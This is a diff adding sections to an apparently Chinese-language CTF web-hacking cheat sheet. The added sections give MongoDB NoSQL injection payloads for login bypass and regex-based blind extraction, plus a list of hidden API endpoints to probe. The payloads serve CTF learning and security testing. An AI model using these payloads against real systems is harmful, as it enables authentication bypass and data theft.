@@ -136,3 +136,34 @@ with concurrent.futures.ThreadPoolExecutor(20) as e:
 - **并发数 20-50 通常够**,不需要上千
 - **看返回**: 正常只该 1 次 success,如果出现 2+ 次 = 竞争成功
 - **有些题需要先"预热"**(创建订单) 再并发"确认"(付款/兑换)
+
+## NoSQL 注入(MongoDB)
+
+当搜索/查询功能用 MongoDB:
+```bash
+# 基础(JSON 参数注入)
+{"username": {"$ne": ""}, "password": {"$ne": ""}}  # 绕过登录
+{"username": "admin", "password": {"$gt": ""}}       # 绕过密码
+
+# URL 参数注入
+?username[$ne]=x&password[$gt]=
+?search[$regex]=flag.*
+
+# 盲注(逐字符提取)
+?password[$regex]=^a    → 看响应差异
+?password[$regex]=^ab   → 逐字符确认
+```
+
+## 隐藏 API 端点发现
+
+```bash
+# 常见隐藏路径(挨个试)
+/api/v1/admin
+/api/v2/ (版本差异,v2 可能没鉴权)
+/api/internal/
+/api/debug/
+/graphql (GraphQL introspection)
+/swagger.json /openapi.json
+/.well-known/
+/api/docs
+```
